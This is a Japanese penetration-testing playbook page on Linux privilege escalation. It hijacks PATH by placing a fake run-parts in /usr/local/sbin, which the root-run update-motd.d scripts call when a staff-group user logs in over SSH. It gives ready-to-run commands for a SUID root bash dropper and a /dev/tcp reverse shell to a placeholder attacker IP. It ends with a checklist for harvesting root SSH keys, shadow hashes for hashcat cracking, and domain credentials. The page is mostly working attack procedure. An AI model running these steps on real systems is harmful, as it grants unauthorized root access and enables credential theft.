# PAM 設定不備による権限昇格

> **スコープ**: `staff` グループ所属 + `/usr/local/sbin` 書き込み可能 + PAM session スクリプト（update-motd.d）がフルパスなしで外部コマンドを呼ぶ、の 3 条件が揃った場合の PATH ハイジャック。pspy でプロセス監視〜注入バイナリ作成〜SSH 再ログイントリガーまで扱う。原理 → `../06_Concepts/PAM.md`

## 着火条件

以下が**すべて**揃った場合に有効：

1. `id` の `groups` に **`staff`** グループが含まれている
2. `/usr/local/sbin` または `/usr/local/bin` に書き込み権限がある（`staff` グループが持つ）
3. SSH ログイン時に `/etc/update-motd.d/` のスクリプトが実行されている（デフォルトで有効な Debian 系）
4. そのスクリプトが `run-parts` などのコマンドを**フルパスなしで**呼び出している

## 環境前提
- 実行環境: テスター端末（pspy 転送・SSH ログイントリガー）/ ターゲット（バイナリ注入）
- 必要なツール: `pspy`（プロセス監視。別途取得が必要、インターネットアクセス要 → `../05_Tools_Reference/pspy.md`）/ `nc`（リバースシェル受信）
- オフライン代替: pspy なしでも `cat /etc/update-motd.d/*` で内容確認は可能

## 先に確認すること

- **`staff` グループを見落とさない**: `id` を実行したとき `sudo` や `docker` がなくても、`staff` グループが権限昇格の橋頭堡になりうる。`staff` グループは `/usr/local` 以下への書き込みを許可するために存在する（Debian ポリシー）
- **PATH の順序を確認する**: `/usr/local/sbin` が `/usr/sbin` より先にある場合、同名バイナリを置くことでシステムの標準コマンドを上書きできる

**攻撃者の思考トレース:** PAM の session スタックは **root 権限で**実行される。SSH ログインを引き金に `update-motd.d` のスクリプトが走り、そのスクリプトが `run-parts` をフルパスなしで呼んでいれば `/usr/local/sbin/run-parts`（攻撃者が書いた偽物）が root として実行される。pspy でプロセスを観察してから確信を持って注入する。

---

## 1. 条件確認（staff グループ / PATH / update-motd.d）

**コマンド:**

```bash
# [Target] staff グループへの所属確認
id | grep staff

# [Target] /usr/local/sbin への書き込み確認
ls -la /usr/local/ | grep sbin

# [Target] PAM セッションスクリプトの確認
ls -la /etc/update-motd.d/
cat /etc/update-motd.d/*
# run-parts や外部コマンドの呼び出しがあるか確認

# [Target] PATH の確認（/usr/local/sbin が前にあるか）
echo $PATH
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `groups=...,999(staff),...` | staff グループ所属 | 書き込み権限と update-motd.d を確認へ |
| `drwxrwsr-x ... staff ... /usr/local/sbin` | staff グループが書き込み可能 | §2 pspy で確認へ |
| `update-motd.d` に `run-parts`（フルパスなし）呼び出しがある | PATH ハイジャック可能 | §3 注入へ |
| `run-parts` が `/usr/bin/run-parts`（フルパス）で呼ばれている | PATH ハイジャック不可 | 別の呼び出し箇所を探す / 他の昇格手法へ |

---

## 2. root が実際に何を実行しているかの観察（pspy）

`/etc/update-motd.d/` の中身を読むだけでは「いつ・何の引き金で・どの PATH で実行されるか」が分からない。SSH ログインを引き金として root が走らせるプロセスを捕捉するには `pspy` を使う。

**事前準備（必須）:** テスター端末で nc リスナーや SSH 接続を準備しておく。

**コマンド:**

```bash
# [Target] pspy をバックグラウンドで起動して観察
/tmp/pspy64 -i 1000

# [Attacker] 別端末から SSH ログインを引き金として張る
ssh [USER]@[TARGET]
```

**pspy 出力で必ず確認する 3 点:**

1. `UID=0` であること（root プロセス）
2. `PATH=` の先頭が `/usr/local/sbin:/usr/local/bin:...` のように staff 書き込み可能ディレクトリで始まっていること
3. `run-parts` などのコマンドが**フルパスなし**で書かれていること

```
# 成立を示す pspy 出力例:
UID=0 PID=xxxx | run-parts --lsbsysinit /etc/update-motd.d
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `UID=0` で `run-parts`（フルパスなし）が観察される | PATH ハイジャック条件が確定 | §3 注入バイナリの作成と配置へ |
| `UID=0` で `/usr/bin/run-parts`（フルパス）が観察される | PATH ハイジャックは効かない | 別の呼び出し箇所を探す |

> pspy の入手・転送・オプション詳細 → `../05_Tools_Reference/pspy.md`

---

## 3. 注入バイナリの作成と配置（SUID bash 版）

**コマンド:**

```bash
# [Target] /usr/local/sbin に既存の run-parts があれば先にバックアップ
cp /usr/local/sbin/run-parts /tmp/run-parts.orig 2>/dev/null

# [Target] run-parts を偽装する悪意のあるスクリプトを作成（SUID bash を作る）
cat > /usr/local/sbin/run-parts << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/bash_root
chmod 4755 /tmp/bash_root
EOF

chmod +x /usr/local/sbin/run-parts

# [Attacker] 別ターミナルから SSH 再接続（PAM の session スタックが動く）
ssh [USER]@[TARGET]

# [Target] 元のセッションに戻り SUID bash を実行
/tmp/bash_root -p
id   # uid=1000(user) gid=1000(user) euid=0(root) ...
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| SSH 再接続後 `/tmp/bash_root` が存在し SUID が付いている | 注入成功 | `bash_root -p` で root シェル取得 → 「昇格成功後に確認すること」セクションへ |
| `/tmp/bash_root` が存在しない | 注入バイナリが呼ばれなかった | `update-motd.d` の条件分岐を確認・pspy で再観察 |

**注意（原状回復）:** `/usr/local/sbin/run-parts`（注入バイナリ）を削除することが必須。元の `run-parts` があればバックアップから復元する。

---

## 4. リバースシェルを直接取る場合

**事前準備（必須）:**

```bash
# [Attacker] リスナーを先に起動
nc -lvnp [PORT]
```

**コマンド:**

```bash
# [Target] リバースシェルペイロードを注入
cat > /usr/local/sbin/run-parts << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/[ATTACKER_IP]/[PORT] 0>&1
EOF
chmod +x /usr/local/sbin/run-parts

# [Attacker] 別端末から SSH 再接続を待つ（または自分で ssh して接続する）
ssh [USER]@[TARGET]
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| テスター側 nc リスナーに root シェルが届く | リバースシェル取得成功 | 「昇格成功後に確認すること」セクションへ |
| nc に接続が来ない | 外部ポートが遮断 / 注入バイナリが呼ばれなかった | §3 の SUID bash 版に切り替える |

**注意（原状回復）:** `/usr/local/sbin/run-parts`（注入バイナリ）と `/tmp/bash_root`（SUID bash）を削除する。

---

## 刺さらなかったとき（全体）

| 状況 | 推定原因 | 代替手段 |
|---|---|---|
| `/etc/update-motd.d/` が存在しない | Debian 以外 / MOTD 無効化 | `/etc/pam.d/sshd` に `pam_exec.so` が設定されているか確認 / `/etc/profile.d/` に root で実行されるスクリプトがあるか |
| pspy で `UID=0` のプロセスが流れない | SSH ログイン時に PAM session が動いていない | `sshd_config` の `UsePAM yes` を確認。または cron が `/usr/local/sbin` を使うプロセスを走らせているか確認 |
| `PATH` 環境変数がリセットされる | `pam_env.so` で PATH が上書き | pspy で実際の PATH を確認 |

---

## 注意点・落とし穴

- **`/usr/local/sbin/run-parts` が既に存在する場合**は上書きになるため、オリジナルを先に保存する（`cp /usr/local/sbin/run-parts /tmp/run-parts.orig 2>/dev/null`）
- **注入したバイナリは必ず `+x`（実行権限）を付与する。** 忘れると実行されない
- **PAM が `run-parts` を呼ばない設定の場合は成立しない。** まず `update-motd.d` のスクリプト内容を確認してから実行する
- **ログに残る。** `/var/log/auth.log` や syslog に SSH セッション記録が残る

---

## 昇格成功後に確認すること（横展開観点）

**「PAM 経由で root になれた = ゴール」ではない。**

- `/root/.ssh/` 配下の秘密鍵 → 他ホストへの SSH 接続性の確認
- `/etc/shadow` 全エントリのハッシュ → 他システムでのパスワード使い回し検証（`hashcat` で一括クラック）
- `/root/.bash_history` → 直近の接続先・コマンド履歴
- root の cron / systemd サービスへの認証情報埋め込み
- AD 連携設定（`/etc/sssd/sssd.conf` / `/etc/krb5.conf`）→ ドメイン側資格情報
- 内部サービス（DB・管理画面・API）の設定ファイル・環境変数 → 接続情報・シークレット
- **`/usr/local/sbin/run-parts`（注入バイナリ）の削除を必ず実施**

---

## 関連技術

- 前：`id` 出力のグループ確認 → `Enumeration_Checklist.md`
- 前：PAM の動作原理 → `../06_Concepts/PAM.md`
- 前：root が SSH ログイン時に何を実行しているかの観察 → `../05_Tools_Reference/pspy.md`
- 後：sudo 権限昇格 → `Sudo_Misconfig.md`
- 後：SUID バイナリ → `SUID_SGID.md`
- 後：取得した認証情報の使い回し確認 → `../02_Initial_Access/Credential_Discovery.md`
